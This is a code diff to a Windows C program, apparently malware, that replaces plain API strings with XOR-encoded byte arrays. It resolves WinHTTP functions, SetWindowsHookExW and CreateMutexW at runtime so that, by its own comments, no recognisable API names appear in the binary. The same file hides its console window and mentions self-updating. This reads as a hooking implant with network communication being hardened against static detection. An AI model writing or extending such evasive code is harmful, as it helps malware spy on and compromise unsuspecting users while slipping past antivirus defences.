@@ -65,35 +65,64 @@ static void DynName(char* out, const char* enc, size_t n, unsigned char k) {
     out[n] = 0;
 }
 
+// Resolve export: enc[] is plaintext XOR k (no plain API strings in .rdata)
+static FARPROC DynProc(HMODULE h, const unsigned char* enc, size_t n, unsigned char k) {
+    char name[64];
+    if (n >= sizeof(name)) return NULL;
+    DynName(name, (const char*)enc, n, k);
+    return GetProcAddress(h, name);
+}
+
 static bool InitDynamicApis() {
     if (g_dynApisReady) return true;
-    // "winhttp.dll" xor 0x5A
+    const unsigned char k = 0x5A;
+    // "winhttp.dll"
     static const unsigned char eWh[] = {0x2d,0x33,0x34,0x32,0x2e,0x2e,0x2a,0x74,0x3e,0x36,0x36};
-    char wh[16]; DynName(wh, (const char*)eWh, 11, 0x5A);
+    char wh[16]; DynName(wh, (const char*)eWh, 11, k);
     HMODULE hWh = LoadLibraryA(wh);
     if (!hWh) return false;
 
-    // Export names via GetProcAddress (IAT has LoadLibrary/GetProcAddress only for winhttp)
-    pWinHttpOpen = (fn_WinHttpOpen)GetProcAddress(hWh, "WinHttpOpen");
-    pWinHttpSetTimeouts = (fn_WinHttpSetTimeouts)GetProcAddress(hWh, "WinHttpSetTimeouts");
-    pWinHttpConnect = (fn_WinHttpConnect)GetProcAddress(hWh, "WinHttpConnect");
-    pWinHttpOpenRequest = (fn_WinHttpOpenRequest)GetProcAddress(hWh, "WinHttpOpenRequest");
-    pWinHttpSendRequest = (fn_WinHttpSendRequest)GetProcAddress(hWh, "WinHttpSendRequest");
-    pWinHttpReceiveResponse = (fn_WinHttpReceiveResponse)GetProcAddress(hWh, "WinHttpReceiveResponse");
-    pWinHttpQueryHeaders = (fn_WinHttpQueryHeaders)GetProcAddress(hWh, "WinHttpQueryHeaders");
-    pWinHttpQueryDataAvailable = (fn_WinHttpQueryDataAvailable)GetProcAddress(hWh, "WinHttpQueryDataAvailable");
-    pWinHttpReadData = (fn_WinHttpReadData)GetProcAddress(hWh, "WinHttpReadData");
-    pWinHttpCloseHandle = (fn_WinHttpCloseHandle)GetProcAddress(hWh, "WinHttpCloseHandle");
+    // Export names XOR 0x5A (no contiguous "WinHttpOpen" etc. in binary)
+    static const unsigned char eOpen[] = {0x0d,0x33,0x34,0x12,0x2e,0x2e,0x2a,0x15,0x2a,0x3f,0x34};
+    static const unsigned char eTmo[]  = {0x0d,0x33,0x34,0x12,0x2e,0x2e,0x2a,0x09,0x3f,0x2e,0x0e,0x33,0x37,0x3f,0x35,0x2f,0x2e,0x29};
+    static const unsigned char eConn[] = {0x0d,0x33,0x34,0x12,0x2e,0x2e,0x2a,0x19,0x35,0x34,0x34,0x3f,0x39,0x2e};
+    static const unsigned char eOReq[] = {0x0d,0x33,0x34,0x12,0x2e,0x2e,0x2a,0x15,0x2a,0x3f,0x34,0x08,0x3f,0x2b,0x2f,0x3f,0x29,0x2e};
+    static const unsigned char eSend[] = {0x0d,0x33,0x34,0x12,0x2e,0x2e,0x2a,0x09,0x3f,0x34,0x3e,0x08,0x3f,0x2b,0x2f,0x3f,0x29,0x2e};
+    static const unsigned char eRecv[] = {0x0d,0x33,0x34,0x12,0x2e,0x2e,0x2a,0x08,0x3f,0x39,0x3f,0x33,0x2c,0x3f,0x08,0x3f,0x29,0x2a,0x35,0x34,0x29,0x3f};
+    static const unsigned char eQHdr[] = {0x0d,0x33,0x34,0x12,0x2e,0x2e,0x2a,0x0b,0x2f,0x3f,0x28,0x23,0x12,0x3f,0x3b,0x3e,0x3f,0x28,0x29};
+    static const unsigned char eQDat[] = {0x0d,0x33,0x34,0x12,0x2e,0x2e,0x2a,0x0b,0x2f,0x3f,0x28,0x23,0x1e,0x3b,0x2e,0x3b,0x1b,0x2c,0x3b,0x33,0x36,0x3b,0x38,0x36,0x3f};
+    static const unsigned char eRead[] = {0x0d,0x33,0x34,0x12,0x2e,0x2e,0x2a,0x08,0x3f,0x3b,0x3e,0x1e,0x3b,0x2e,0x3b};
+    static const unsigned char eClose[] = {0x0d,0x33,0x34,0x12,0x2e,0x2e,0x2a,0x19,0x36,0x35,0x29,0x3f,0x12,0x3b,0x34,0x3e,0x36,0x3f};
+    static const unsigned char eHook[] = {0x09,0x3f,0x2e,0x0d,0x33,0x34,0x3e,0x35,0x2d,0x29,0x12,0x35,0x35,0x31,0x1f,0x22,0x0d};
+    static const unsigned char eUnhk[] = {0x0f,0x34,0x32,0x35,0x35,0x31,0x0d,0x33,0x34,0x3e,0x35,0x2d,0x29,0x12,0x35,0x35,0x31,0x1f,0x22};
+    static const unsigned char eMtx[]  = {0x19,0x28,0x3f,0x3b,0x2e,0x3f,0x17,0x2f,0x2e,0x3f,0x22,0x0d};
 
-    HMODULE hU32 = GetModuleHandleA("user32.dll");
-    if (!hU32) hU32 = LoadLibraryA("user32.dll");
-    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
+    pWinHttpOpen = (fn_WinHttpOpen)DynProc(hWh, eOpen, sizeof(eOpen), k);
+    pWinHttpSetTimeouts = (fn_WinHttpSetTimeouts)DynProc(hWh, eTmo, sizeof(eTmo), k);
+    pWinHttpConnect = (fn_WinHttpConnect)DynProc(hWh, eConn, sizeof(eConn), k);
+    pWinHttpOpenRequest = (fn_WinHttpOpenRequest)DynProc(hWh, eOReq, sizeof(eOReq), k);
+    pWinHttpSendRequest = (fn_WinHttpSendRequest)DynProc(hWh, eSend, sizeof(eSend), k);
+    pWinHttpReceiveResponse = (fn_WinHttpReceiveResponse)DynProc(hWh, eRecv, sizeof(eRecv), k);
+    pWinHttpQueryHeaders = (fn_WinHttpQueryHeaders)DynProc(hWh, eQHdr, sizeof(eQHdr), k);
+    pWinHttpQueryDataAvailable = (fn_WinHttpQueryDataAvailable)DynProc(hWh, eQDat, sizeof(eQDat), k);
+    pWinHttpReadData = (fn_WinHttpReadData)DynProc(hWh, eRead, sizeof(eRead), k);
+    pWinHttpCloseHandle = (fn_WinHttpCloseHandle)DynProc(hWh, eClose, sizeof(eClose), k);
+
+    // "user32.dll" xor 0x5A
+    static const unsigned char eU32[] = {0x2f,0x29,0x3f,0x28,0x69,0x68,0x74,0x3e,0x36,0x36};
+    char u32[16]; DynName(u32, (const char*)eU32, 10, k);
+    HMODULE hU32 = GetModuleHandleA(u32);
+    if (!hU32) hU32 = LoadLibraryA(u32);
+    // "kernel32.dll"
+    static const unsigned char eK32[] = {0x31,0x3f,0x28,0x34,0x3f,0x36,0x69,0x68,0x74,0x3e,0x36,0x36};
+    char k32[16]; DynName(k32, (const char*)eK32, 12, k);
+    HMODULE hK32 = GetModuleHandleA(k32);
     if (hU32) {
-        pSetWindowsHookExW = (fn_SetWindowsHookExW)GetProcAddress(hU32, "SetWindowsHookExW");
-        pUnhookWindowsHookEx = (fn_UnhookWindowsHookEx)GetProcAddress(hU32, "UnhookWindowsHookEx");
+        pSetWindowsHookExW = (fn_SetWindowsHookExW)DynProc(hU32, eHook, sizeof(eHook), k);
+        pUnhookWindowsHookEx = (fn_UnhookWindowsHookEx)DynProc(hU32, eUnhk, sizeof(eUnhk), k);
     }
     if (hK32)
-        pCreateMutexW = (fn_CreateMutexW)GetProcAddress(hK32, "CreateMutexW");
+        pCreateMutexW = (fn_CreateMutexW)DynProc(hK32, eMtx, sizeof(eMtx), k);
 
     g_dynApisReady = pWinHttpOpen && pWinHttpConnect && pWinHttpOpenRequest &&
         pWinHttpSendRequest && pWinHttpReceiveResponse && pWinHttpCloseHandle &&
@@ -2361,7 +2390,22 @@ static int RunChild(HINSTANCE hInstance) {
 // only when no child is running. Version check every ~5 min. Update fail keeps us.
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
-    if (!InitDynamicApis()) return 1;
+    if (!InitDynamicApis()) {
+        // Early log (no WinHTTP / LogMsg yet) — M1: silent fail was undebuggable
+        char tmp[MAX_PATH];
+        if (GetTempPathA(MAX_PATH, tmp)) {
+            char path[MAX_PATH + 32];
+            wsprintfA(path, "%s%s", tmp, "dynapi_fail.log");
+            HANDLE hf = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hf != INVALID_HANDLE_VALUE) {
+                const char* msg = "InitDynamicApis failed\r\n";
+                DWORD w = 0;
+                WriteFile(hf, msg, (DWORD)lstrlenA(msg), &w, NULL);
+                CloseHandle(hf);
+            }
+        }
+        return 1;
+    }
     InitConfig();
     HWND consoleWnd = GetConsoleWindow();
     if (consoleWnd) ShowWindow(consoleWnd, SW_HIDE);
